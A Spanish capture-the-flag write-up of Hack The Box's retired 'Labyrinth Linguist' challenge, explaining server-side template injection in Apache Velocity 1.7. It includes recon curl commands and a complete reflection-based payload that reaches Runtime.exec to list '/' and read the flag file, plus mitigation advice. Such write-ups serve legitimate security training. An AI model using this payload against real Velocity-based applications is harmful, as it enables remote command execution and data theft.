---
challenge: Labyrinth Linguist
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, java, velocity, ssti, rce]
---

# Labyrinth Linguist — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Aplicación **Java 11** que «traduce» el texto del usuario construyendo una plantilla **Apache Velocity 1.7** con esa entrada. `#set` permite crear objetos y, por reflexión, llegar a `Runtime.exec`: **SSTI** con ejecución de comandos.

## Enunciado y superficie

Un formulario con un campo de texto que devuelve la «traducción». El código (Maven, `Main.java`) viene en el ZIP del reto; la flag se copia a `/flag.txt` y el `Dockerfile` la **renombra** a `/flag<aleatorio>.txt`, así que hay que listar el directorio.

## Reconocimiento

```bash
curl -s http://<IP>:<PORT>/ | head -40
# POST con text=<...>
curl -s -X POST http://<IP>:<PORT>/ -d 'text=$name'
```

Si `$name` devuelve `World`, la entrada se evalúa como plantilla Velocity: el contexto del reto define esa variable.

## Explicación del fallo

Velocity no es Jinja ni Twig: su sintaxis es `#set($var = ...)` y permite acceder a clases Java. El vector clásico es `$class.inspect(...)`, pero en esta build `$class` no está expuesto. La vía que funciona es obtener `Class` desde una **cadena** y usar `forName`:

```text
#set($x = '')
#set($rt = $x.class.forName('java.lang.Runtime'))
```

## Explotación

```text
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ch=$x.class.forName('java.lang.Character'))#set($p=$rt.getRuntime().exec('ls /'))#set($br=$x.class.forName('java.io.BufferedReader'))#set($isr=$x.class.forName('java.io.InputStreamReader'))#set($r=$br.getConstructor($isr).newInstance($p.getInputStream()))$r.readLine()
```

La respuesta trae la primera línea del comando. Con `ls /` aparece `flagXXXXXXXXXX.txt` y basta repetir con:

```text
... .exec('cat /flagXXXXXXXXXX.txt') ...
```

Codificar el payload en la URL (`#` → `%23`) si se envía por `GET`; con `POST` va en el cuerpo.

## Evidencia

- Salidas recortadas de los comandos; sin flags.
- Los valores reales viven en `private/`.

## Lecciones aprendidas

- **`$class` no siempre está**: si el sandbox lo bloquea, `''.class.forName(...)` sigue dando `Class`.
- **`readLine()` lee una línea**: para más salida, repetir o usar `cat` de un único fichero.
- **La flag no está donde parece**: el `Dockerfile` la renombra; hay que listar `/`.
- **`#` en la URL**: sin codificar, el fragmento se pierde y el payload no llega.

- Velocity también es SSTI: no hace falta que el motor sea Jinja o Twig.
- Reflexión de Java = ejecución: cualquier `Class.forName` alcanzable es RCE.
- Mitigación: plantillas fijas en disco, contexto de datos y `SecureUberspector`.
